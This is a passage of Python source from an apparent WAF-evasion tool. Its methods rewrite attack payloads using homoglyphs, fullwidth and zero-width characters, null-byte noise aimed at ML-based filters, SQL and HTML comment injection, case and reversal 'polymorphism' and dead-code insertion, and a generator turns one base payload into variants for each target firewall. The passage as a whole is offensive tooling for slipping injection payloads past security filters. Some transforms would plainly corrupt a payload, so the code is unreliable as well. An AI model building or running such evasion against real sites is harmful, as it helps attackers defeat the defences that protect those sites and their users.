        """Add combining diacritical marks"""
        combining_chars = ['\u0300', '\u0301', '\u0302', '\u0303', '\u0308']
        result = []
        for char in text:
            result.append(char)
            if char.isalpha() and random.random() < 0.4:  # 40% chance
                result.append(random.choice(combining_chars))
        return ''.join(result)
    
    def _math_alphanumeric(self, text: str) -> str:
        """Convert to mathematical alphanumeric symbols"""
        math_map = {
            'A': '𝔄', 'B': '𝔅', 'C': 'ℭ', 'D': '𝔇', 'E': '𝔈',
            'F': '𝔉', 'G': '𝔊', 'H': 'ℌ', 'I': 'ℑ', 'J': '𝔍',
            'K': '𝔎', 'L': '𝔏', 'M': '𝔐', 'N': '𝔑', 'O': '𝔒',
            'P': '𝔓', 'Q': '𝔔', 'R': 'ℜ', 'S': '𝔖', 'T': '𝔗',
            'U': '𝔘', 'V': '𝔙', 'W': '𝔚', 'X': '𝔛', 'Y': '𝔜',
            'Z': 'ℨ', 'a': '𝔞', 'b': '𝔟', 'c': '𝔠', 'd': '𝔡',
            'e': '𝔢', 'f': '𝔣', 'g': '𝔤', 'h': '𝔥', 'i': '𝔦',
            'j': '𝔧', 'k': '𝔨', 'l': '𝔩', 'm': '𝔪', 'n': '𝔫',
            'o': '𝔬', 'p': '𝔭', 'q': '𝔮', 'r': '𝔯', 's': '𝔰',
            't': '𝔱', 'u': '𝔲', 'v': '𝔳', 'w': '𝔴', 'x': '𝔵',
            'y': '𝔶', 'z': '𝔷'
        }
        return ''.join(math_map.get(c, c) for c in text)
    
    def _emoji_substitute(self, text: str) -> str:
        """Substitute characters with similar emojis"""
        emoji_map = {
            'a': '🅰️',
            'b': '🅱️',
            'o': '🅾️',
            'i': 'ℹ️',
            '!': '❗',
            '?': '❓',
            '*': '⭐',
            '+': '➕',
            '-': '➖',
            '=': '➗'
        }
        return ''.join(emoji_map.get(c.lower(), c) for c in text)
    
    def _string_concatenation(self, text: str) -> str:
        """Split strings and concatenate"""
        if len(text) < 3:
            return text
        
        split_point = random.randint(1, len(text)-1)
        part1 = text[:split_point]
        part2 = text[split_point:]
        
        concat_methods = [
            f"{part1}+{part2}",
            f"{part1}{part2}",
            f'"{part1}" "{part2}"',
            f"{part1}.concat({part2})",
            f"`{part1}${{{part2}}}`"
        ]
        
        return random.choice(concat_methods)
    
    def _comment_injection(self, text: str) -> str:
        """Inject comments to break up patterns"""
        comment_types = [
            ('/*', '*/'),  # CSS/JS comments
            ('<!--', '-->'),  # HTML comments
            ('#', '\n'),  # Shell comments
            ('--', '\n'),  # SQL comments
            ('//', '\n')  # JS comments
        ]
        
        start_comment, end_comment = random.choice(comment_types)
        
        if len(text) < 5:
            return text
        
        insert_point = random.randint(1, len(text)-2)
        return text[:insert_point] + start_comment + 'random' + end_comment + text[insert_point:]
    
    def _js_obfuscation(self, text: str) -> str:
        """Obfuscate JavaScript code"""
        if not any(c in text for c in ['<', '>', '"', "'", '=', '(', ')', '{', '}', '[', ']']):
            return text
        
        obfuscation_methods = [
            lambda x: x.replace('=', ' = '),
            lambda x: x.replace('(', ' ( '),
            lambda x: x.replace(')', ' ) '),
            lambda x: x.replace('{', ' { '),
            lambda x: x.replace('}', ' } '),
            lambda x: x.replace('[', ' [ '),
            lambda x: x.replace(']', ' ] '),
            lambda x: x.replace('"', ' " '),
            lambda x: x.replace("'", " ' ")
        ]
        
        return random.choice(obfuscation_methods)(text)
    
    def _css_obfuscation(self, text: str) -> str:
        """Obfuscate CSS expressions"""
        if not any(c in text for c in ['{', '}', ':', ';', '.', '#']):
            return text
        
        obfuscation_methods = [
            lambda x: x.replace('{', ' { '),
            lambda x: x.replace('}', ' } '),
            lambda x: x.replace(':', ' : '),
            lambda x: x.replace(';', ' ; '),
            lambda x: x.replace('.', ' . '),
            lambda x: x.replace('#', ' # ')
        ]
        
        return random.choice(obfuscation_methods)(text)
    
    def _html_obfuscation(self, text: str) -> str:
        """Obfuscate HTML attributes and tags"""
        if not any(c in text for c in ['<', '>', '=', '"', "'"]):
            return text
        
        obfuscation_methods = [
            lambda x: x.replace('<', ' < '),
            lambda x: x.replace('>', ' > '),
            lambda x: x.replace('=', ' = '),
            lambda x: x.replace('"', ' " '),
            lambda x: x.replace("'", " ' ")
        ]
        
        return random.choice(obfuscation_methods)(text)
    
    def _sql_comment_obfuscation(self, text: str) -> str:
        """Use SQL comments to break up queries"""
        if not any(c in text for c in ['SELECT', 'FROM', 'WHERE', 'UNION', 'INSERT', 'UPDATE', 'DELETE']):
            return text
        
        comment_types = ['/*', '--', '#']
        comment = random.choice(comment_types)
        
        if len(text) < 5:
            return text
        
        insert_point = random.randint(1, len(text)-2)
        return text[:insert_point] + comment + 'random' + text[insert_point:]
    
    def _polymorphic_code(self, text: str) -> str:
        """Generate polymorphic code variations"""
        if len(text) < 3:
            return text
        
        variations = [
            text,
            text[::-1],  # Reverse
            text.upper(),
            text.lower(),
            self._randomize_case(text),
            self._alternating_case(text)
        ]
        
        return random.choice(variations)
    
    def _dead_code_injection(self, text: str) -> str:
        """Inject dead code to confuse analysis"""
        dead_code_snippets = [
            'var x = 1;',
            'if (false) { }',
            '/* dead code */',
            '// unused variable',
            'function unused() { return; }'
        ]
        
        if len(text) < 5:
            return text
        
        insert_point = random.randint(1, len(text)-2)
        dead_code = random.choice(dead_code_snippets)
        return text[:insert_point] + dead_code + text[insert_point:]
    
    def _code_reordering(self, text: str) -> str:
        """Reorder code execution"""
        if len(text) < 10:
            return text
        
        # Simple reordering by splitting on common delimiters
        delimiters = [';', ',', ' ', '\n', '\t']
        for delim in delimiters:
            if delim in text:
                parts = text.split(delim)
                if len(parts) > 1:
                    random.shuffle(parts)
                    return delim.join(parts)
        
        return text
    
    def _ml_evasion(self, text: str) -> str:
        """Evade ML-based WAFs with adversarial examples"""
        # Add noise and variations that confuse ML models
        noise_chars = ['\x00', '\x01', '\x02', '\x03', '\x04', '\x05']
        
        if len(text) < 3:
            return text
        
        result = []
        for char in text:
            result.append(char)
            if random.random() < 0.1:  # 10% chance
                result.append(random.choice(noise_chars))
        
        return ''.join(result)
    
    def _randomize_case(self, text: str) -> str:
        """Randomize case of text"""
        return ''.join(random.choice([c.upper(), c.lower()]) for c in text)
    
    def _to_fullwidth(self, text: str) -> str:
        """Convert text to fullwidth characters"""
        fullwidth_map = {
            'A': 'Ａ', 'B': 'Ｂ', 'C': 'Ｃ', 'D': 'Ｄ', 'E': 'Ｅ',
            'F': 'Ｆ', 'G': 'Ｇ', 'H': 'Ｈ', 'I': 'Ｉ', 'J': 'Ｊ',
            'K': 'Ｋ', 'L': 'Ｌ', 'M': 'Ｍ', 'N': 'Ｎ', 'O': 'Ｏ',
            'P': 'Ｐ', 'Q': 'Ｑ', 'R': 'Ｒ', 'S': 'Ｓ', 'T': 'Ｔ',
            'U': 'Ｕ', 'V': 'Ｖ', 'W': 'Ｗ', 'X': 'Ｘ', 'Y': 'Ｙ',
            'Z': 'Ｚ', 'a': 'ａ', 'b': 'ｂ', 'c': 'ｃ', 'd': 'ｄ',
            'e': 'ｅ', 'f': 'ｆ', 'g': 'ｇ', 'h': 'ｈ', 'i': 'ｉ',
            'j': 'ｊ', 'k': 'ｋ', 'l': 'ｌ', 'm': 'ｍ', 'n': 'ｎ',
            'o': 'ｏ', 'p': 'ｐ', 'q': 'ｑ', 'r': 'ｒ', 's': 'ｓ',
            't': 'ｔ', 'u': 'ｕ', 'v': 'ｖ', 'w': 'ｗ', 'x': 'ｘ',
            'y': 'ｙ', 'z': 'ｚ', '0': '０', '1': '１', '2': '２',
            '3': '３', '4': '４', '5': '５', '6': '６', '7': '７',
            '8': '８', '9': '９', ' ': '　'
        }
        return ''.join(fullwidth_map.get(c, c) for c in text)
    
    def _insert_zero_width(self, text: str) -> str:
        """Insert zero-width characters"""
        zero_width_chars = ['\u200B', '\u200C', '\u200D', '\uFEFF']
        result = []
        for char in text:
            result.append(char)
            if random.random() < 0.1:  # 10% chance
                result.append(random.choice(zero_width_chars))
        return ''.join(result)
    
    def _homoglyph_substitute(self, text: str) -> str:
        """Substitute characters with homoglyphs"""
        homoglyphs = {
            'a': ['а', 'ɑ', 'α'],
            'e': ['е', 'ε'],
            'o': ['о', 'ο', '0'],
            'p': ['р', 'ρ'],
            'c': ['с', 'ϲ'],
            'x': ['х', 'χ'],
            'y': ['у', 'γ'],
            'i': ['і', 'ι', '1'],
            'l': ['l', '1', '|'],
            's': ['ѕ', 'ѕ'],
            'n': ['п', 'η'],
            'u': ['υ', 'μ']
        }
        
        result = []
        for char in text.lower():
            if char in homoglyphs:
                result.append(random.choice(homoglyphs[char]))
            else:
                result.append(char)
        return ''.join(result)
    
    def get_bypass_techniques(self, waf_name: str = 'Generic') -> List[Dict[str, Any]]:
        """Get applicable bypass techniques for a specific WAF"""
        techniques = []
        for category, tech_list in self.techniques.items():
            for technique in tech_list:
                if waf_name in technique['applicable_wafs'] or 'Generic' in technique['applicable_wafs']:
                    techniques.append(technique)
        return techniques
    
    def apply_technique(self, payload: str, technique_name: str) -> str:
        """Apply a specific bypass technique to a payload"""
        for category, tech_list in self.techniques.items():
            for technique in tech_list:
                if technique['name'] == technique_name:
                    return technique['example'](payload)
        return payload
    
    def generate_evasion_payloads(self, base_payload: str, waf_name: str = 'Generic') -> List[str]:
        """Generate multiple evasion payloads"""
        payloads = [base_payload]
        techniques = self.get_bypass_techniques(waf_name)
        
        for technique in techniques[:10]:  # Limit to 10 techniques
            try:
                evaded_payload = technique['example'](base_payload)
                if evaded_payload != base_payload:
                    payloads.append(evaded_payload)
            except Exception:
                continue
        
        return payloads